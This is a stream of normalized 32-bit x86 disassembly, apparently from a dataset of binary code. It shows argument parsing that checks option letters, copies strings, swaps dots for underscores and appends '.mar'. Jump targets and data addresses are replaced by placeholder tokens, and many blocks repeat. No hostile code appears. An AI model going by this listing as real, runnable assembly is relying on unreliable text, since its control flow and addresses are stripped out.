mov [ ebp - 0x240 ] edx
cmp [ ebp - 0x245 ] 0x0
jne r-xdata
movsx eax [ ebp - 0x108 ]
cmp eax 0x2d
jne r-xdata
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x24c ] ecx
mov edx [ ebp - 0x24c ]
add edx 0x1
mov [ ebp - 0x250 ] edx
mov eax [ ebp - 0x24c ]
mov cl [ eax ]
mov [ ebp - 0x251 ] cl
add [ ebp - 0x24c ] 0x1
cmp [ ebp - 0x251 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] edx
cmp [ ebp - 0x258 ] 0x2
jne r-xdata
movsx eax [ ebp - 0x107 ]
cmp eax 0x63
jne r-xdata
movsx edx [ ebp - 0x107 ]
cmp edx 0x64
jne r-xdata
mov ecx [ ebp - 0x10c ]
add ecx 0x1
cmp [ ebp - 0x21c ] ecx
jle r-xdata
movsx ecx [ ebp - 0x107 ]
cmp ecx 0x68
jne r-xdata
mov eax [ ebp - 0x10c ]
add eax 0x1
cmp [ ebp - 0x21c ] eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x25c ] ecx
mov edx [ ebp - 0x25c ]
add edx 0x1
mov [ ebp - 0x260 ] edx
movsx edx [ ebp - 0x107 ]
cmp edx 0x6c
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x31c ] eax
mov ecx [ ebp - 0x31c ]
add ecx 0x1
mov [ ebp - 0x320 ] ecx
mov eax [ ebp - 0x25c ]
mov cl [ eax ]
mov [ ebp - 0x261 ] cl
add [ ebp - 0x25c ] 0x1
cmp [ ebp - 0x261 ] 0x0
jne r-xdata
mov edx [ ebp - 0x25c ]
sub edx [ ebp - 0x260 ]
mov [ ebp - 0x268 ] edx
je r-xdata
jmp r-xdata
movsx eax [ ebp - 0x107 ]
cmp eax 0x65
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x31c ]
mov al [ edx ]
mov [ ebp - 0x321 ] al
add [ ebp - 0x31c ] 0x1
cmp [ ebp - 0x321 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x31c ]
sub ecx [ ebp - 0x320 ]
mov [ ebp - 0x328 ] ecx
je r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x26c ] edx
mov [ ebp - 0x270 ] rwxdata
mov eax [ ebp - 0x270 ]
mov [ ebp - 0x274 ] eax
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x32c ] ecx
mov [ ebp - 0x330 ] rwxdata
mov edx [ ebp - 0x330 ]
mov [ ebp - 0x334 ] edx
mov ecx [ ebp - 0x26c ]
mov dl [ ecx ]
mov [ ebp - 0x275 ] dl
mov eax [ ebp - 0x270 ]
mov cl [ ebp - 0x275 ]
mov [ eax ] cl
mov edx [ ebp - 0x26c ]
add edx 0x1
mov [ ebp - 0x26c ] edx
mov eax [ ebp - 0x270 ]
add eax 0x1
mov [ ebp - 0x270 ] eax
cmp [ ebp - 0x275 ] 0x0
jne r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x32c ]
mov cl [ eax ]
mov [ ebp - 0x335 ] cl
mov edx [ ebp - 0x330 ]
mov al [ ebp - 0x335 ]
mov [ edx ] al
mov ecx [ ebp - 0x32c ]
add ecx 0x1
mov [ ebp - 0x32c ] ecx
mov edx [ ebp - 0x330 ]
add edx 0x1
mov [ ebp - 0x330 ] edx
cmp [ ebp - 0x335 ] 0x0
jne r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x27c ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x280 ] eax
mov ecx [ ebp - 0x280 ]
mov [ ebp - 0x284 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x33c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x340 ] edx
mov eax [ ebp - 0x340 ]
mov [ ebp - 0x344 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x27c ]
mov al [ edx ]
mov [ ebp - 0x285 ] al
mov ecx [ ebp - 0x280 ]
mov dl [ ebp - 0x285 ]
mov [ ecx ] dl
mov eax [ ebp - 0x27c ]
add eax 0x1
mov [ ebp - 0x27c ] eax
mov ecx [ ebp - 0x280 ]
add ecx 0x1
mov [ ebp - 0x280 ] ecx
cmp [ ebp - 0x285 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x33c ]
mov dl [ ecx ]
mov [ ebp - 0x345 ] dl
mov eax [ ebp - 0x340 ]
mov cl [ ebp - 0x345 ]
mov [ eax ] cl
mov edx [ ebp - 0x33c ]
add edx 0x1
mov [ ebp - 0x33c ] edx
mov eax [ ebp - 0x340 ]
add eax 0x1
mov [ ebp - 0x340 ] eax
cmp [ ebp - 0x345 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x28c ] eax
mov ecx [ ebp - 0x28c ]
add ecx 0x1
mov [ ebp - 0x290 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x34c ] edx
mov eax [ ebp - 0x34c ]
add eax 0x1
mov [ ebp - 0x350 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x28c ]
mov al [ edx ]
mov [ ebp - 0x291 ] al
add [ ebp - 0x28c ] 0x1
cmp [ ebp - 0x291 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
mov [ ebp - 0x298 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x298 ]
jae r-xdata
mov ecx [ ebp - 0x34c ]
mov dl [ ecx ]
mov [ ebp - 0x351 ] dl
add [ ebp - 0x34c ] 0x1
cmp [ ebp - 0x351 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34c ]
sub eax [ ebp - 0x350 ]
mov [ ebp - 0x358 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x358 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x29c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x2a0 ] edx
mov eax [ ebp - 0x2a0 ]
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x35c ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x360 ] ecx
mov edx [ ebp - 0x360 ]
mov [ ebp - 0x364 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x29c ]
mov dl [ ecx ]
mov [ ebp - 0x2a5 ] dl
mov eax [ ebp - 0x2a0 ]
mov cl [ ebp - 0x2a5 ]
mov [ eax ] cl
mov edx [ ebp - 0x29c ]
add edx 0x1
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x2a0 ]
add eax 0x1
mov [ ebp - 0x2a0 ] eax
cmp [ ebp - 0x2a5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x35c ]
mov cl [ eax ]
mov [ ebp - 0x365 ] cl
mov edx [ ebp - 0x360 ]
mov al [ ebp - 0x365 ]
mov [ edx ] al
mov ecx [ ebp - 0x35c ]
add ecx 0x1
mov [ ebp - 0x35c ] ecx
mov edx [ ebp - 0x360 ]
add edx 0x1
mov [ ebp - 0x360 ] edx
cmp [ ebp - 0x365 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x2ac ] edx
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2b0 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x36c ] ecx
mov edx [ ebp - 0x36c ]
add edx 0x1
mov [ ebp - 0x370 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x2ac ]
mov dl [ ecx ]
mov [ ebp - 0x2b1 ] dl
add [ ebp - 0x2ac ] 0x1
cmp [ ebp - 0x2b1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2ac ]
sub eax [ ebp - 0x2b0 ]
mov [ ebp - 0x2b8 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x2b8 ]
jae r-xdata
mov eax [ ebp - 0x36c ]
mov cl [ eax ]
mov [ ebp - 0x371 ] cl
add [ ebp - 0x36c ] 0x1
cmp [ ebp - 0x371 ] 0x0
jne r-xdata
mov edx [ ebp - 0x36c ]
sub edx [ ebp - 0x370 ]
mov [ ebp - 0x378 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x378 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x2bc ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x2c0 ] ecx
mov edx [ ebp - 0x2c0 ]
mov [ ebp - 0x2c4 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x37c ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x380 ] eax
mov ecx [ ebp - 0x380 ]
mov [ ebp - 0x384 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2bc ]
mov cl [ eax ]
mov [ ebp - 0x2c5 ] cl
mov edx [ ebp - 0x2c0 ]
mov al [ ebp - 0x2c5 ]
mov [ edx ] al
mov ecx [ ebp - 0x2bc ]
add ecx 0x1
mov [ ebp - 0x2bc ] ecx
mov edx [ ebp - 0x2c0 ]
add edx 0x1
mov [ ebp - 0x2c0 ] edx
cmp [ ebp - 0x2c5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x224 ]
add edx 0x1
mov [ ebp - 0x224 ] edx
mov edx [ ebp - 0x37c ]
mov al [ edx ]
mov [ ebp - 0x385 ] al
mov ecx [ ebp - 0x380 ]
mov dl [ ebp - 0x385 ]
mov [ ecx ] dl
mov eax [ ebp - 0x37c ]
add eax 0x1
mov [ ebp - 0x37c ] eax
mov ecx [ ebp - 0x380 ]
add ecx 0x1
mov [ ebp - 0x380 ] ecx
cmp [ ebp - 0x385 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x218 ]
movsx edx [ ebp + ecx - 0x210 ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x220 ]
movsx edx [ ecx + rwxdata ]
cmp edx 0x2e
je r-xdata
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp + eax - 0x210 ] 0x5f
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
add ecx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] ecx
jge r-xdata
mov eax [ ebp - 0x220 ]
add eax 0x1
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x2e
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x6d
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x61
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
sub edx [ ebp - 0x218 ]
mov eax [ ebp - 0x214 ]
mov cl [ edx + rwxdata ]
mov [ ebp + eax - 0x210 ] cl
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x2cc ] ecx
mov edx [ ebp - 0x2cc ]
add edx 0x1
mov [ ebp - 0x2d0 ] edx
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x38c ] eax
mov ecx [ ebp - 0x38c ]
add ecx 0x1
mov [ ebp - 0x390 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x2cc ]
mov cl [ eax ]
mov [ ebp - 0x2d1 ] cl
add [ ebp - 0x2cc ] 0x1
cmp [ ebp - 0x2d1 ] 0x0
jne r-xdata
mov edx [ ebp - 0x2cc ]
sub edx [ ebp - 0x2d0 ]
mov [ ebp - 0x2d8 ] edx
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x2d8 ]
jae r-xdata
mov edx [ ebp - 0x38c ]
mov al [ edx ]
mov [ ebp - 0x391 ] al
add [ ebp - 0x38c ] 0x1
cmp [ ebp - 0x391 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38c ]
sub ecx [ ebp - 0x390 ]
mov [ ebp - 0x398 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x398 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
mov edx [ ebp - 0x214 ]
mov al [ ebp + edx - 0x210 ]
mov [ ecx + rwxdata ] al
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x2dc ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x2e0 ] eax
mov ecx [ ebp - 0x2e0 ]
mov [ ebp - 0x2e4 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x39c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x3a0 ] edx
mov eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x2dc ]
mov al [ edx ]
mov [ ebp - 0x2e5 ] al
mov ecx [ ebp - 0x2e0 ]
mov dl [ ebp - 0x2e5 ]
mov [ ecx ] dl
mov eax [ ebp - 0x2dc ]
add eax 0x1
mov [ ebp - 0x2dc ] eax
mov ecx [ ebp - 0x2e0 ]
add ecx 0x1
mov [ ebp - 0x2e0 ] ecx
cmp [ ebp - 0x2e5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x39c ]
mov dl [ ecx ]
mov [ ebp - 0x3a5 ] dl
mov eax [ ebp - 0x3a0 ]
mov cl [ ebp - 0x3a5 ]
mov [ eax ] cl
mov edx [ ebp - 0x39c ]
add edx 0x1
mov [ ebp - 0x39c ] edx
mov eax [ ebp - 0x3a0 ]
add eax 0x1
mov [ ebp - 0x3a0 ] eax
cmp [ ebp - 0x3a5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
